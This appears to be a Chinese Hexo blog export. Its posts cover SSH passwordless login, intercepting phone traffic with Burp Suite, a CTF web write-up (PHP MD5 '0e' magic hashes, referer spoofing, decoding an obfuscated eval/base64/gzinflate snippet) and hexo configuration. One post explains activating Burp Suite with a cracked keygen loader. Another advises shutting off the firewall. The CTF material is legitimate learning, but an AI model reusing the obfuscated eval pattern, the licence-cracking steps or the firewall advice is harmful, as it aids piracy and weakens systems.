    <content type="text"><![CDATA[首先,确定是否有安装SSH服务命令：ps -e | grep ssh*如果没有任何显示,则没有安装该服务其次,安装SSH-serversudo apt-get install openssh-server接着,更重要的是安装SSH-clientsudo apt-get install openssh-client确认安装SSH服务成功与否ps -e | grep ssh*如果,看到sshd表明ssh-server启动了; 服务器端设置ssh免密首先Linux要配置好ssh免密连接cd /root/.ssh/如果没有此文件，可以先使用ssh localhost之后便可以进入.ssh文件ls查看只有这一个文件,known_hosts先在本机生成公钥和私钥, ssh-keygen -t rsa将公钥写入认证里面,cat ./id_rsa.pub &gt;&gt; ./authorized_keys修改文件authorized_keys权限为600,chmod 600 .ssh/authorized_keys至此，ssh免密已经配置好了，上述步骤如下 使用Xshell免密远程连接linux转自https://www.linuxidc.com/Linux/2015-03/114947.htm补充网址里面的第六步：复制生成的公钥到linux可以直接将本地id_rsa_2048.pub直接复制过去,将其放入/root/.ssh/文件夹下，使用此命令写入认证cat ./id_rsa_2048.pub &gt;&gt; ./authorized_keys此时再按照上面的网址操作即可 使用cmder免密连接linux先在本机生成公钥和私钥, ssh-keygen -t rsa将生成的id_rsa.pub重命名为id_rsa0.pub(因为linux下一句有一个与此同名的文件),上传至服务器;window下生成的id_rsa.pub存放于C:\Users\用户名\.ssh下将其放入/root/.ssh/文件夹下;使用此命令写入认证cat ./id_rsa0.pub &gt;&gt; ./authorized_keys此时Cmder连接linux已经免密了 PS：使用ssh连接，关闭linux系统防火墙才可连接，关闭防火墙命令service iptables stop]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Destiny]]></title>
    <url>%2F2018%2F04%2F05%2FDestiny%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;成功正因我志在成功！成功呈概率分布，关键是你能不能坚持到成功开始呈现的那一刻。&nbsp;&nbsp;人生的路上，我们都在奔跑，我们总在赶超一些人，也总在被一些人超越。人生的要义，一是欣赏沿途的风景，二是抵达遥远的终点。人生的秘诀，就在于寻找一种最适合自己的速度，莫因疾进而不堪重荷，莫因迟缓而空耗生命。人生的快乐，就是走自己的路，看自己的景。]]></content>
      <categories>
        <category>Daily</category>
      </categories>
      <tags>
        <tag>Daily</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burpsuite抓取收据数据包]]></title>
    <url>%2F2018%2F04%2F05%2FBurpsuite%E6%8A%93%E5%8F%96%E6%94%B6%E6%8D%AE%E6%95%B0%E6%8D%AE%E5%8C%85%2F</url>
    <content type="text"><![CDATA[首先给手机导入crt证书，电脑证书为der格式，直接修改后缀为crt格式即可，此链接已经改好了网盘下载:https://pan.baidu.com/s/1JmdjJ1VO40Vjv0a2OkGVNw &nbsp;密码：6bs8电脑和手机要处于同一个网络，手机WIFI设置好代理及端口，使用Burpsuite进行抓包分析，使用手机访问想要抓取的网站或App里面某一功能，Burpsuite的history里面有记录，可进行分析Burpsuite使用教程,此处需要知道重放包的使用以及history即可此处举例：坦白说&nbsp;&nbsp;QQ新出的坦白说功能，抓取到的页面Host应为ti.qq.com，抓取到的数据为加密类型，解密网址]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web]]></title>
    <url>%2F2018%2F04%2F05%2FCTF-Web%2F</url>
    <content type="text"><![CDATA[1、md5 collision，传送参数，函数如下：123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo "nctf&#123;*****************&#125;";&#125; else &#123; echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 这个题目如果知道MD5碰撞的概念，同时知道了在PHP中的MD5中的0e的比较，这道题目就十分的简单。如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。例子如下，其他符合/0[eE]\d{30}/的MD5值： 原码 md5 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s532378020a 0e220463095855511507588041205815 240610708 0e462097431906509019562988736854 2、层层递进查看源代码，最下面发现有子网站，直到最后找到404.html,发现注释里面存在flag3、JSAAencode代码报错，未定义的字符，修改一下，在控制台里面运行一下即可，关于控制台指南4、单身二十年使用Burpsuite抓包，发history里面藏着一个search_key.php，查看response，出现flag5、Are you from google?修改referer为 https://www.google.com提供一个http头部字段详解6、php decode123456789&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?&gt; eval函数详解上述代码最后一行eval改为echo放入本地运行即可]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web-WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Burpsuite1.7.31]]></title>
    <url>%2F2018%2F04%2F05%2F%E5%AE%89%E8%A3%85Burpsuite1-7-31%2F</url>
    <content type="text"><![CDATA[起码要有一个Burpsuite的安装包，下载链接 密码：zgcxzip里面有两个文件首先打开burp-loader-keygen.jar，点击右上角的Run接着会出现将图三红色框内的License序列号复制到图二里面，点击右下角的Next，进入图五，点击Manual activation点击图五里面的Copy request，进入图一，粘贴到此处粘贴完后，出现红色框内的序列号，复制到图五的Paste response里面，点击Next，至此安装已经完成以后每次使用时双击burp-loader-keygen.jar，点击右上角的Run即可]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo]]></title>
    <url>%2F2018%2F04%2F02%2Fhexo%2F</url>
    <content type="text"><![CDATA[hexo next主题配置本站采用Misc风格，主题背景默认的，不过颜色可以自己设置，新建一个tags标签，hexo new page tags，此时会在本地创建一个tags文件夹,想让侧栏出现tags和分类，只需将这个弄好就OK了 添加本地搜索安装hexo-generator-searchdbnpm install hexo-generator-searchdb --save 修改站点配置文件12345search: path: search.xml field: post format: html limit: 10000 修改主题配置文件123# Local searchlocal_search: enable: true 接入网易云音乐进入网易云音乐官网，搜索想要的歌曲，生成外链接，复制此代码到/hexo/themes/next/layout/_macro/sidebar.swig，复制到112行 每次修改完成后先 heco clean,再hexo d -g即可发布 插入一句Markdownpad使用，使用时修改选项为commonMark; 一篇文章使用多个标签tags： - 标签1 - 标签2]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Github+next</tag>
      </tags>
  </entry>
</search>
